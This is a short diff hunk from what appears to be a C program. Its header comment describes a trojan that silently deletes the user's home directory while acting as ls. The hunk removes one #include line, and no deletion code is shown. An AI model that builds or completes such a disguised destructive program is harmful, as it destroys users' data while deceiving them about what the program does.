@@ -1,5 +1,4 @@
 /*  This program quietly deletes everything in the user's home directory while performing the function of ls. Use with discretion  */
-#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
